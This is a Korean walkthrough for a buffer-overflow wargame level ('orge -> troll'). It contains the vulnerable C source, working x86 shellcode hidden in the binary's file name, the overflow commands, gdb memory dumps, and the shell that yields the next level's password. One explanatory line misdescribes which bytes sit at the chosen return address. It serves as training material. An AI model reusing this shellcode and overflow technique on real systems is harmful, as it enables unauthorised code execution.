# orge -> troll
```C
/*
        The Lord of the BOF : The Fellowship of the BOF
        - troll
        - check argc + argv hunter
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
        char buffer[40];
        int i;

        // here is changed
        if(argc != 2){
                printf("argc must be two!\n");
                exit(0);
        }

        // egghunter
        for(i=0; environ[i]; i++)
                memset(environ[i], 0, strlen(environ[i]));

        if(argv[1][47] != '\xbf')
        {
                printf("stack is still your friend.\n");
                exit(0);
        }

        // check the length of argument
        if(strlen(argv[1]) > 48){
                printf("argument is too long!\n");
                exit(0);
        }

        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);

        // one more!
        memset(argv[1], 0, strlen(argv[1]));
}
```

첫 번째 if 문에서 argc!=2라는 조건을 만들었다. 즉, argv[2]를 사용하지 못한다는 것이다.   
또한, argv[1]을 0으로 모두 초기화 시킨다. 그래서 우리는 argv[0]밖에 사용하지 못한다.
파일 이름을 쉘코드로 하고 argv[0]의 주소를 리턴주소로 하면 된다.
하지만 파일명을 변경하려고 하면 없는 파일이라고 되지 않는데 그 이유는 쉘코드에 있는 \x2f가 /로 읽혀서 그런 것이다.
그래서 \x2f가 없는 쉘코드를 사용해야 한다.
```
\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81
```
```
[orge@localhost orge]$ rename troll `python -c 'print "\x90"*20+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"'` troll
```
그 다음 tmp 파일에 복사하여 core dump를 일으키고 분석한다.
```
[orge@localhost orge]$ mkdir tmp
[orge@localhost orge]$ cp `python -c 'print "\x90"*20+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"'` tmp
[orge@localhost orge]$ cd tmp
[orge@localhost tmp]$ ./`python -c 'print "\x90"*20+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"+" "+"D"*44+"\xff\xff\xff\xbf"'`
DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDÿÿÿ¿
Segmentation fault (core dumped)
```
```
[orge@localhost tmp]$ gdb -c core -q
Core was generated by `./ë^1É±2€lÿ€éuöëèêÿÿÿ2ÁQi00tii0cjoŠäQTŠâš±
Î        '.
Program terminated with signal 11, Segmentation fault.
#0  0xbfffffff in ?? ()
(gdb) x/1000x $esp
0xbffffa40:     0x00000000      0xbffffa84      0xbffffa90      0x40013868
0xbffffa50:     0x00000002      0x08048450      0x00000000      0x08048471
0xbffffa60:     0x08048500      0x00000002      0xbffffa84      0x08048390
0xbffffa70:     0x0804866c      0x4000ae60      0xbffffa7c      0x40013e90
0xbffffa80:     0x00000002      0xbffffb7d      0xbffffbc4      0x00000000
0xbffffa90:     0xbffffbf5      0xbffffc08      0xbffffc20      0xbffffc3f
0xbffffaa0:     0xbffffc61      0xbffffc6b      0xbffffe2e      0xbffffe4d
0xbffffab0:     0xbffffe67      0xbffffe7c      0xbffffe98      0xbffffea3
0xbffffac0:     0xbffffeb0      0xbffffeb8      0xbffffec2      0xbffffed2
0xbffffad0:     0xbffffee0      0xbffffeee      0xbffffeff      0xbfffff0a
0xbffffae0:     0xbfffff1a      0xbfffff5a      0xbfffffa3      0x00000000
0xbffffaf0:     0x00000003      0x08048034      0x00000004      0x00000020
0xbffffb00:     0x00000005      0x00000006      0x00000006      0x00001000
0xbffffb10:     0x00000007      0x40000000      0x00000008      0x00000000
0xbffffb20:     0x00000009      0x08048450      0x0000000b      0x000001fb
0xbffffb30:     0x0000000c      0x000001fb      0x0000000d      0x000001fb
0xbffffb40:     0x0000000e      0x000001fb      0x00000010      0x0f8bfbff
0xbffffb50:     0x0000000f      0xbffffb78      0x00000000      0x00000000
0xbffffb60:     0x00000000      0x00000000      0x00000000      0x00000000
0xbffffb70:     0x00000000      0x00000000      0x36383669      0x902f2e00
0xbffffb80:     0x90909090      0x90909090      0x90909090      0x90909090
0xbffffb90:     0xeb909090      0xc9315e11      0x6c8032b1      0x8001ff0e
0xbffffba0:     0xf67501e9      0xeae805eb      0x32ffffff      0x306951c1
---Type <return> to continue, or q <return> to quit---
[1]+  Stopped                 gdb -c core -q
```
D가 입력되어 있는 0xbffffb80을 리턴 주소로 하면 된다.
```
[orge@localhost orge]$ ./`python -c 'print "\x90"*20+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"+" "+"D"*44+"\x80\xfb\xff\xbf"'`
DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD€ûÿ¿
bash$ my-pass
euid = 508
aspirin
```







